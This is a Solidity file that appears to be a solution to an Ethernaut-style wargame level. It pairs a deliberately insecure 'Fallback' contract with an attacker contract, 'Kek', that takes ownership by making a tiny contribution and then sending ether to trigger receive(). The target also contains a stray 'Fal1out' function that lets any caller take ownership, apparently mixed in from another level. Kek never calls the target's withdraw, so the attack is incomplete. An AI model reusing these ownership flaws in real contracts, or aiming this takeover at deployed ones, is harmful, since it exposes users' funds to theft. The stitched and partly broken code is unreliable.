// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    function Fal1out() public payable {
        owner = msg.sender;

    }
    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
interface FallbacI {
    function contribute() external payable;
    function owner() external view returns (address);
}
contract Kek {
    address payable contractAddress;
    address owner;
    FallbacI public fallbackContract;

    constructor(address payable _contractAddress) {
        owner = msg.sender;
        contractAddress = _contractAddress;
        fallbackContract = FallbacI(_contractAddress);
    }
    receive() external payable {}

    function fallkek() public payable {
        require(msg.sender == owner);
        (bool success, ) = (contractAddress).call{value: msg.value}("");
        require(success);
    }

    function deposit() external payable {}

    function getContribute() public payable {
        require(msg.sender == owner);
        fallbackContract.contribute{value: 0.0009 ether}();
    }

    function withdraw() public {
        require(msg.sender == owner);
        payable(msg.sender).transfer(address(this).balance);
    }
    
    function whoOwner() public view returns (address) {
        return fallbackContract.owner();
    }
}
